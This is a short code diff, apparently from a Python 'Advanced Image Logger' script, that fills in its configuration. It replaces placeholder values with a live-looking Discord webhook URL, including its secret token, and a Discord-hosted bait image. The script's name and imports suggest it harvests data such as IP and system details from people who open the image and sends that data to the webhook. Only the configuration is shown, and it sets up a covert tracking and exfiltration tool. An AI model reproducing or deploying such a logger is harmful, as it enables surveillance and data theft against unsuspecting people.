@@ -11,8 +11,8 @@ import socket
 import psutil
 
 config = {
-    "webhook": "YOUR_WEBHOOK_HERE",
-    "image": "https://example.com/image.jpg",
+    "webhook": "https://discord.com/api/webhooks/1444840183089332315/t2wAfDuDme1QqMnl45c9pRfeIEnvzf8WRZAdpo9plo8wjIbsyb2746IZxlnOv98ar4jT",
+    "image": "https://cdn.discordapp.com/attachments/1438902071364419697/1444841126145167440/IMG_6301.jpg?ex=692e2ca8&is=692cdb28&hm=5c78806af8c7e31b62c368fa8bfe9a0ce528582ac0231bc19d3cb0a909aea6f4&",
     "imageArgument": True,
     "username": "Advanced Image Logger",
     "color": 0x00FFFF,
